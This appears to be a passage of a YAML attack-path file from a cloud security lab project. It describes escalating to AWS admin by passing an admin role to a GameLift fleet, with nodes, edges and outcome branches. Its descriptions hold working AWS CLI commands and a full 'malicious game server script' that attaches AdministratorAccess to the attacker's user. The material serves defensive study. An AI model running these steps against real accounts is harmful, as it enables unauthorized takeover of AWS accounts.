    url: "https://docs.aws.amazon.com/gamelift/latest/developerguide/setting-up-role.html"

learningEnvironments:
  pathfinding-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinding-labs
    scenario: "privesc-one-hop/to-admin/gamelift-001-iam-passrole+gamelift-createbuild+gamelift-createfleet"
    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"

attackVisualization:
  nodes:
    - id: start
      label: Starting Principal
      type: principal
      description: The principal with `iam:PassRole`, `gamelift:CreateBuild`, `gamelift:CreateFleet`, and `gamelift:RequestUploadCredentials` permissions. Can be an IAM user or role.

    - id: build
      label: GameLift Build
      type: resource
      description: |
        A new GameLift build record created by the attacker. The build record is a container for a game server binary that GameLift deploys to fleet instances. The attacker uploads a malicious game server script that calls `iam:AttachUserPolicy` using the fleet instance role's credentials.

        Command:
        ```bash
        aws gamelift create-build \
          --name privesc-build \
          --operating-system AMAZON_LINUX_2023 \
          --server-sdk-version 5.2.0 \
          --build-version 1.0.0
        ```

        After creating the build, `gamelift:RequestUploadCredentials` provides temporary S3 credentials to upload the malicious binary to GameLift's managed S3 bucket.

    - id: fleet
      label: GameLift Fleet
      type: resource
      description: |
        A new GameLift fleet created by the attacker with the admin IAM instance role attached. GameLift provisions EC2 instances for the fleet and deploys the malicious game server binary. The `SHARED_CREDENTIAL_FILE` credentials provider makes the instance role's credentials available to game server processes.

        Command:
        ```bash
        aws gamelift create-fleet \
          --name privesc-fleet \
          --build-id BUILD_ID \
          --compute-type EC2 \
          --ec2-instance-type c5.large \
          --instance-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --instance-role-credentials-provider SHARED_CREDENTIAL_FILE \
          --runtime-configuration '{"ServerProcesses":[{"LaunchPath":"/local/game/gameserver.sh","ConcurrentExecutions":1}]}'
        ```

    - id: game_server
      label: Game Server Process
      type: payload
      color: '#99ccff'
      description: |
        The malicious game server script that executes on the GameLift fleet instance. The script uses the instance role credentials made available via `SHARED_CREDENTIAL_FILE` to call `iam:AttachUserPolicy` and escalate the starting principal's privileges.

        Malicious game server script:
        ```bash
        #!/bin/bash
        # Wait for SHARED_CREDENTIAL_FILE credentials to be available
        sleep 10
        # Use the instance role credentials to escalate privileges
        aws iam attach-user-policy \
          --user-name STARTING_USER \
          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
        echo "Privilege escalation complete"
        # Keep running so the fleet does not immediately terminate
        while true; do sleep 60; done
        ```

        The game server process is launched automatically when the fleet's EC2 instances become active. Fleet provisioning typically takes 5-15 minutes.

    - id: instance_role
      label: Admin Instance Role
      type: principal
      description: The IAM role attached to the GameLift fleet instances. The role must trust `ec2.amazonaws.com` and is made available to game server processes via `SHARED_CREDENTIAL_FILE` (the `--instance-role-credentials-provider` parameter). The game server script uses this role's credentials to make privileged IAM API calls.

    - id: admin
      label: Effective Administrator
      type: outcome
      description: The fleet instance role has AdministratorAccess or equivalent permissions. The malicious game server script successfully calls `iam:AttachUserPolicy` using those credentials, granting the starting principal full administrative access to the AWS account.

    - id: some_perms
      label: Some additional access
      type: outcome
      color: '#ffeb99'
      description: The fleet instance role has some elevated permissions but not full admin access. The game server script can leverage those permissions for data access, security configuration changes, or additional privilege escalation paths, but cannot directly attach AdministratorAccess to the starting principal.

    - id: no_access
      label: No additional access
      type: outcome
      color: '#cccccc'
      description: The fleet instance role only has minimal permissions scoped to GameLift operations. The game server script executes but provides limited privilege escalation value.

  edges:
    - from: start
      to: build
      label: gamelift:CreateBuild + gamelift:RequestUploadCredentials
      description: |
        Create a GameLift build record and upload the malicious game server binary. `gamelift:RequestUploadCredentials` provides temporary S3 credentials to upload the binary to GameLift's managed S3 bucket.

        Step 1 — Create build record:
        ```bash
        aws gamelift create-build \
          --name privesc-build \
          --operating-system AMAZON_LINUX_2023 \
          --server-sdk-version 5.2.0 \
          --build-version 1.0.0
        ```

        Step 2 — Get upload credentials and upload binary:
        ```bash
        UPLOAD_CREDS=$(aws gamelift request-upload-credentials --build-id $BUILD_ID)
        AWS_ACCESS_KEY_ID=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.AccessKeyId') \
        AWS_SECRET_ACCESS_KEY=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.SecretAccessKey') \
        AWS_SESSION_TOKEN=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.SessionToken') \
        aws s3 cp /tmp/gameserver-build/ s3://$S3_BUCKET/$S3_KEY --recursive
        ```

    - from: start
      to: fleet
      label: iam:PassRole + gamelift:CreateFleet
      description: |
        Create a GameLift fleet with the admin IAM instance role attached, using the `SHARED_CREDENTIAL_FILE` credentials provider so game server processes can access the role credentials. This is the `iam:PassRole` step.

        Command:
        ```bash
        aws gamelift create-fleet \
          --name privesc-fleet \
          --build-id BUILD_ID \
          --compute-type EC2 \
          --ec2-instance-type c5.large \
          --fleet-type ON_DEMAND \
          --instance-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --instance-role-credentials-provider SHARED_CREDENTIAL_FILE \
          --runtime-configuration '{"ServerProcesses":[{"LaunchPath":"/local/game/gameserver.sh","ConcurrentExecutions":1}]}'
        ```

    - from: fleet
      to: game_server
      label: Fleet provisions EC2, game server starts
      description: GameLift provisions EC2 instances for the fleet and deploys the malicious game server binary. When the instances become active (typically 5-15 minutes), GameLift automatically launches the game server process defined in the runtime configuration.

    - from: game_server
      to: instance_role
      label: Server accesses role via SHARED_CREDENTIAL_FILE
      description: The game server process accesses the fleet instance role's temporary credentials via the `SHARED_CREDENTIAL_FILE` credentials provider. GameLift writes the instance role credentials to a shared credential file on the instance, making them available to processes running on the fleet without requiring direct IMDS queries.

    - from: instance_role
      to: admin
      label: If role has admin permissions
      branch: A
      condition: admin
      description: If the fleet instance role has AdministratorAccess or IAM write permissions, the game server script successfully calls `iam:AttachUserPolicy`, granting the starting principal full administrative access.

    - from: instance_role
      to: some_perms
      label: If role has some elevated permissions
      branch: B
      condition: some_permissions
      description: If the instance role has elevated permissions but not IAM write access, the game server script can leverage those permissions for data access or reconnaissance but cannot directly elevate the starting principal.

    - from: instance_role
      to: no_access
      label: If role has minimal permissions
      branch: C
      condition: no_permissions
      description: If the instance role only has minimal permissions scoped to GameLift operations, the game server script executes but provides limited privilege escalation value.
